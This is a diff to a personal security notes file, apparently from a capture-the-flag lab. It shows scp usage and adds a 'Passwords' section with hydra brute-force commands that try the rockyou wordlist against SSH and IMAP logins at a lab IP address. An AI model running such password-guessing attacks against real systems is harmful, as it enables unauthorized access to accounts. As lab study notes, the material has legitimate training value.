@@ -39,3 +39,8 @@ system located in the /home/mark directory to ~, i.e., the root of the home dire
 ~ scp backup.tar.bz2 mark@10.10.186.49:/home/mark/. This command will copy the file backup.tar.bz2 from the local system 
 to the directory /home/mark/ on the remote system.
 
+################ Passwords ##################
+
+# hydra -l username -P wordlist.txt server service // hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.186.49 ssh
+# hydra -l lazie -P rockyou.txt 10.10.186.49 imap
+
